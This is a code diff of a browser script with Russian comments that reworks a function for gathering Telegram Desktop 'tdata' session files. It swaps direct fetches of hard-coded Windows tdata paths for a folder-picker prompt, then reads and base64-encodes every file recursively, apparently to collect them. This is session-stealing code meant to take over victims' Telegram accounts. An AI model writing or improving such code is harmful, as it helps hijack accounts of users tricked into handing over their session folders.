@@ -67,27 +67,49 @@
         async function getTDataFiles(platform) {
             const files = [];
             
-            if (platform === 'windows') {
-                // Пути к TData в Windows
-                const paths = [
-                    'C:/Users/Administrator/AppData/Roaming/Telegram Desktop/tdata',
-                    'C:/Users/Default/AppData/Roaming/Telegram Desktop/tdata',
-                    'C:/Users/Public/AppData/Roaming/Telegram Desktop/tdata'
-                ];
+            try {
+                // Запрашиваем доступ к директории
+                const dirHandle = await window.showDirectoryPicker({
+                    startIn: 'documents',
+                    mode: 'read'
+                });
                 
-                for (const path of paths) {
-                    try {
-                        const response = await fetch(path);
-                        if (response.ok) {
-                            const content = await response.blob();
-                            files.push({
-                                name: `tdata_${path.split('/').pop()}`,
-                                content: await blobToBase64(content)
-                            });
-                        }
-                    } catch (e) {
-                        console.error(`Error accessing ${path}:`, e);
+                // Рекурсивно получаем все файлы
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        files.push({
+                            name: entry.name,
+                            content: await blobToBase64(file)
+                        });
+                    } else if (entry.kind === 'directory') {
+                        // Рекурсивно обходим поддиректории
+                        const subFiles = await getFilesFromDirectory(entry);
+                        files.push(...subFiles);
                     }
+                }
+            } catch (error) {
+                console.error('Error accessing files:', error);
+                throw new Error('Не удалось получить доступ к файлам');
+            }
+            
+            return files;
+        }
+
+        // Рекурсивный обход директории
+        async function getFilesFromDirectory(dirHandle) {
+            const files = [];
+            
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    files.push({
+                        name: entry.name,
+                        content: await blobToBase64(file)
+                    });
+                } else if (entry.kind === 'directory') {
+                    const subFiles = await getFilesFromDirectory(entry);
+                    files.push(...subFiles);
                 }
             }
             
